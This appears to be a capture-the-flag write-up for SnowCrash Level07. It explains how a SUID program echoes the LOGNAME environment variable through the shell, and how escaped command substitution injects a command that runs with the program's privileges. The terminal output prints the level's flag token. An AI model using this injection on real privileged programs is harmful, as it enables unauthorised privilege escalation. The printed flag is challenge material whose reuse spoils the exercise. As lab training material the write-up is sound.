# Level07

In this level we have a program in which have a getenv. The environment variable used is `LOGNAME`. 
It is printed using `echo %s\n`. So we can try to expand our `LOGNAME` env variable to execute `getflag` program.

In previous level we have find that [backquote/backtick](https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands) are used to interprete string as command system like $();

```bash
level07@SnowCrash:~$ export LOGNAME=`getflag`; ./level07 
Check flag.Here is your token :
sh: 2: Syntax error: ")" unexpected
level07@SnowCrash:~$ export LOGNAME=$(getflag); ./level07 
Check flag.Here is your token :
sh: 2: Syntax error: ")" unexpected
```
Our variable is called but is interpreted directly without permission. It's not our choice.  
We want that the program `level07` interpreted our command because it has permissions (SUID is set).  
So to avoid that the variable being immediatly expand we can escape.  

```bash
level07@SnowCrash:~$ export LOGNAME=\$\(getflag\); ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$ export LOGNAME=\`getflag\`; ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
